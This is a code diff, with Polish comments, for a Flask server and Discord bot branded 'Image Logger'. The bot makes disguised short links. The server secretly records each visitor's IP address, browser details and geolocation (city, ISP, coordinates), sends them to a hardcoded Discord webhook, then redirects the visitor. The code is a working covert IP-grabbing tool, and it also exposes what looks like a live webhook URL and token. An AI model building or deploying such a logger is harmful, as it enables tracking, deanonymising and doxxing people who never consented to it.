@@ -12,10 +12,10 @@ from discord import app_commands
 # ========================================================
 # CONFIGURATION
 # ========================================================
-# Twój webhook (serwer wyśle tu sformatowaną kartę z danymi)
+# Twój webhook (Publiczny webhook, serwer wyśle tu dane)
 WEBHOOK_URL = 'https://discord.com/api/webhooks/1508140013651624067/nMxvkUrDRE_0GyeZ15dPV_1DIJ04VGUlKlSQCgG6C61v0118dLK81ojbtovwab88Xcal'
 
-# Pobieranie tokenu ze zmiennych środowiskowych Rendera
+# BEZPIECZNE: Kod pobiera token z pamięci hostingu (Render). Brak tokenu w pliku!
 BOT_TOKEN = os.environ.get('DISCORD_BOT_TOKEN')
 
 # Adres Twojej aplikacji na Renderze
@@ -28,7 +28,6 @@ app = Flask(__name__)
 links_database = {}
 
 def generate_random_id(length=6):
-    """Generuje losowy ciąg znaków dla identyfikatora linku."""
     characters = string.ascii_lowercase + string.digits
     return ''.join(random.choice(characters) for _ in range(length))
 
@@ -52,11 +51,8 @@ def redirect_to_url(link_id):
         return "Link nie istnieje lub wygasł.", 404
 
     user_agent = request.headers.get('User-Agent', 'Nieznany')
-    
-    # Pobieranie IP z uwzględnieniem proxy Rendera
     user_ip = request.headers.get('X-Forwarded-For', '').split(',')[0].strip() or request.remote_addr
 
-    # Domyślne wartości Geo-IP w razie błędu API
     geo_data = {
         "status": "fail", "country": "Nieznany", "regionName": "Nieznany",
         "city": "Nieznany", "isp": "Nieznany", "as": "Nieznany",
@@ -64,7 +60,6 @@ def redirect_to_url(link_id):
     }
 
     try:
-        # Ignorowanie localhost do testów lokalnych
         ip_to_check = '181.41.202.157' if user_ip in ['127.0.0.1', '::1'] else user_ip
         fields = "status,message,country,regionName,city,isp,as,lat,lon,timezone,hosting"
         geo_response = requests.get(f"http://ip-api.com/json/{ip_to_check}?fields={fields}", timeout=5)
@@ -73,12 +68,11 @@ def redirect_to_url(link_id):
     except Exception as e:
         print(f"Błąd GeoIP: {e}")
 
-    # Struktura wiadomości Embed (identyczna jak na zdjęciu)
     discord_payload = {
         "embeds": [{
             "title": "🌐 Image Logger - IP Logged",
             "description": "**A User Opened the Original Link!**\n\n**Endpoint:** `/api/image`",
-            "color": 1752220,  # Kolor morski (Decimal)
+            "color": 1752220,
             "fields": [
                 {
                     "name": "📌 IP Info:",
@@ -132,8 +126,6 @@ bot_client = MyClient()
 @app_commands.describe(url="Wklej oryginalny adres URL")
 async def link(interaction: discord.Interaction, url: str):
     await interaction.response.defer(ephemeral=True)
-    
-    # Adres lokalny 127.0.0.1, ponieważ bot i serwer działają w tym samym kontenerze
     local_url = f"http://127.0.0.1:{os.environ.get('PORT', 5000)}/generate"
     
     try:
@@ -147,7 +139,6 @@ async def link(interaction: discord.Interaction, url: str):
         await interaction.followup.send(content=f"🔴 Brak komunikacji z serwerem: {e}", ephemeral=True)
 
 def run_bot():
-    """Uruchamia pętlę zdarzeń bota w osobnym wątku."""
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
     loop.run_until_complete(bot_client.start(BOT_TOKEN))
@@ -156,14 +147,14 @@ def run_bot():
 # MAIN ENTRYPOINT
 # ========================================================
 if __name__ == '__main__':
-    # Uruchomienie bota w tle, tylko jeśli token jest ustawiony w panelu
-    if BOT_TOKEN:
-        print("Wykryto token bota. Uruchamianie bota w osobnym wątku...")
-        threading.Thread(target=run_bot, daemon=True).start()
+    if BOT_TOKEN and BOT_TOKEN.strip() != "":
+        print("Wykryto token bota. Uruchamianie bota w tle...")
+        try:
+            threading.Thread(target=run_bot, daemon=True).start()
+        except Exception as e:
+            print(f"🚨 BŁĄD bota: {e}")
     else:
-        print("🚨 BŁĄD: Zmienna środowiskowa DISCORD_BOT_TOKEN nie została znaleziona!")
-        print("Upewnij się, że dodałeś ją w zakładce Environment na Renderze.")
+        print("⚠️ UWAGA: Brak zmiennej DISCORD_BOT_TOKEN w panelu Render! Bot nie ruszy.")
 
-    # Uruchomienie głównego serwera Flask
     port = int(os.environ.get("PORT", 5000))
     app.run(host='0.0.0.0', port=port)
